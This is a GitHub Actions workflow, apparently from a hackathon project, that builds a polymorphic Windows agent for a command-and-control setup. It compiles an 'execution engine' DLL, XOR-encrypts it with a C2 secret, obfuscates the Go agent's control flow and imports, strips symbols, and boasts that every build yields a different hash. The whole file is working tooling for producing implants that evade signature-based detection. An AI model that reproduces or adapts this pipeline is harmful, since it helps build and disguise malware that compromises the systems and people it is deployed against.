# .github/workflows/build.yml
#
# Proteus — Polymorphic CI/CD Pipeline
# ======================================
# Triggered on every push to main.
#
# Each run:
#   1. Builds the C execution engine as a Windows DLL
#   2. Encrypts the DLL with the C2_AUTH_XOR secret
#   3. Cross-compiles agent/main.go to a Windows PE
#   4. Uploads the binary as a GitHub Actions artifact
#   5. Prints the SHA-256 in the step summary
#
# No two runs produce the same binary — that is the polymorphic guarantee.
#
# Required GitHub Secrets:
#   C2_AUTH       — the Cloudflare Worker's C2_AUTH value
#   C2_AUTH_XOR   — exactly 64 hexadecimal characters (32 bytes)

name: Polymorphic CI Build

on:
  push:
    branches: [main]
  workflow_dispatch:          # allow manual trigger from the GitHub UI

permissions:
  contents: read              # least-privilege: read repo, nothing else

jobs:
  polymorphic-build:
    name: "🔄 Polymorphic agent build"
    runs-on: ubuntu-latest    # Linux runner — cross-compiles to Windows via GOOS

    steps:
      # ── 1. Checkout ─────────────────────────────────────────────────────────
      - name: Checkout repository
        uses: actions/checkout@v4

      # ── 2. Go toolchain ─────────────────────────────────────────────────────
      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: "1.25"
          # Cache keyed to go.sum — speeds up dependency fetches on repeat runs
          cache-dependency-path: agent/go.sum

      # ── 3. Python (for the polymorphic engine) ───────────────────────────────
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      # ── 4. Install polymorphic engine dependencies ───────────────────────────
      - name: Install polymorphic engine dependencies
        run: |
          pip install --quiet --upgrade pip
          pip install --quiet \
            pefile==2023.2.7       \
            cryptography==41.0.7   \
            pycryptodome==3.19.0   \
            capstone==5.0.1        \
            colorama==0.4.6        \
            tqdm==4.66.1           \
            pyelftools==0.30       \
            macholib==1.16.3       \
            astor==0.8.1           \
            lief                    \
            pytest
          pip install --quiet \
            -r compiler/requirements.txt \
            -r manager/requirements.txt

      - name: Install MinGW-w64 and CMake
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq mingw-w64 cmake

      - name: Build execution engine (libjockey.dll)
        run: |
          mkdir -p execution_engine/build
          cd execution_engine/build
          cmake .. \
            -DCMAKE_BUILD_TYPE=Release \
            -DBUILD_SHARED=ON \
            -DHARDEN=ON \
            -DCMAKE_SYSTEM_NAME=Windows \
            -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
            -DCMAKE_RC_COMPILER=x86_64-w64-mingw32-windres
          cmake --build . --parallel
          test -s libjockey.dll

      - name: Encrypt engine DLL
        env:
          C2_AUTH_XOR: ${{ secrets.C2_AUTH_XOR }}
        run: |
          if [ -z "$C2_AUTH_XOR" ]; then
            echo "[-] C2_AUTH_XOR secret is not set" >&2
            exit 1
          fi
          if ! [[ "$C2_AUTH_XOR" =~ ^[0-9a-fA-F]{64}$ ]]; then
            echo "[-] C2_AUTH_XOR must be exactly 64 hexadecimal characters" >&2
            exit 1
          fi

          python - <<'PY'
          import binascii
          import os
          from pathlib import Path

          key = binascii.unhexlify(os.environ["C2_AUTH_XOR"])
          source = Path("execution_engine/build/libjockey.dll")
          destination = Path("agent/libjockey.enc")
          data = source.read_bytes()
          destination.write_bytes(
              bytes(value ^ key[index % len(key)] for index, value in enumerate(data))
          )
          print(f"[+] Encrypted {len(data)} bytes -> {destination}")
          PY

      # ── 5. Pre-fetch Go module cache (cross-compile) ─────────────────────────
      #
      # golang.org/x/sys/windows/registry is a Windows-only import in agent/main.go.
      # We tell Go we're building for Windows so it fetches the right platform files.
      - name: Pre-fetch Go dependencies (GOOS=windows)
        run: |
          cd agent
          GOOS=windows GOARCH=amd64 go mod download
          echo "[+] Go module cache ready"

      # ── 6. Run the polymorphic build ──────────────────────────────────────────
      #
      # ci_build.py (repo root):
      #   • copies all *.go from agent/ into a tmp dir
      #   • copies go.mod + go.sum (so golang.org/x/sys resolves)
      #   • applies control-flow flattening + import-table obfuscation to main.go
      #   • compiles with GOOS=windows GOARCH=amd64 -trimpath -s -w
      #   • writes to build/agent_<random-id>.exe
      - name: Run polymorphic build
        env:
          C2_AUTH_TOKEN: ${{ secrets.C2_AUTH }}
          C2_AUTH_XOR: ${{ secrets.C2_AUTH_XOR }}
        run: |
          python ci_build.py \
            --output-dir build/ \
            --os windows        \
            --arch amd64

      # ── 7. Compute hash & export to environment ───────────────────────────────
      - name: Compute binary hash
        id: hash
        run: |
          BINARY=$(ls build/agent_*.exe | head -1)
          if [ -z "$BINARY" ]; then
            echo "[-] No binary produced"
            exit 1
          fi
          BINARY_NAME=$(basename "$BINARY")
          HASH=$(sha256sum "$BINARY" | awk '{print $1}')
          SIZE=$(stat -c '%s' "$BINARY")

          # Export for upload step name + summary
          echo "binary_name=$BINARY_NAME" >> "$GITHUB_OUTPUT"
          echo "sha256=$HASH"             >> "$GITHUB_OUTPUT"
          echo "size_bytes=$SIZE"         >> "$GITHUB_OUTPUT"

          echo ""
          echo "╔══════════════════════════════════════════════════════════════╗"
          echo "║  Polymorphic Build Result                                    ║"
          echo "╠══════════════════════════════════════════════════════════════╣"
          printf "║  Binary  : %-50s║\n" "$BINARY_NAME"
          printf "║  SHA-256 : %-50s║\n" "${HASH:0:50}"
          printf "║  (cont.) : %-50s║\n" "${HASH:50}"
          printf "║  Size    : %-50s║\n" "$SIZE bytes"
          echo "╚══════════════════════════════════════════════════════════════╝"
          echo ""
          echo "Every CI run produces a DIFFERENT hash — polymorphic guarantee ✓"

      # ── 8. Upload artifact ───────────────────────────────────────────────────
      #
      # Artifact name embeds the short commit SHA so you can trace binary → commit.
      - name: Upload polymorphic binary
        uses: actions/upload-artifact@v4
        with:
          name: "polymorphic-agent-${{ github.sha }}"
          path: build/*.exe
          retention-days: 30
          if-no-files-found: error

      # ── 9. GitHub step summary ────────────────────────────────────────────────
      - name: Write build summary
        run: |
          {
            echo "## 🔄 Polymorphic Build — \`${{ github.sha }}\`"
            echo ""
            echo "| Field | Value |"
            echo "|:------|:------|"
            echo "| **Binary** | \`${{ steps.hash.outputs.binary_name }}\` |"
            echo "| **SHA-256** | \`${{ steps.hash.outputs.sha256 }}\` |"
            echo "| **Size** | ${{ steps.hash.outputs.size_bytes }} bytes |"
            echo "| **Commit** | \`${{ github.sha }}\` |"
            echo "| **Branch** | \`${{ github.ref_name }}\` |"
            echo "| **Triggered by** | ${{ github.event_name }} |"
            echo ""
            echo "> **Polymorphic guarantee:** every push to \`main\` produces a binary"
            echo "> with a **different hash**, **obfuscated symbols**, and **encrypted"
            echo "> engine payload** — directly satisfying the SIH problem statement."
          } >> "$GITHUB_STEP_SUMMARY"

      # ── 10. Run Python test suites ─────────────────────────────────────────
      - name: Run Python tests
        run: |
          python -m pytest compiler/tests runtime/tests manager/tests -q
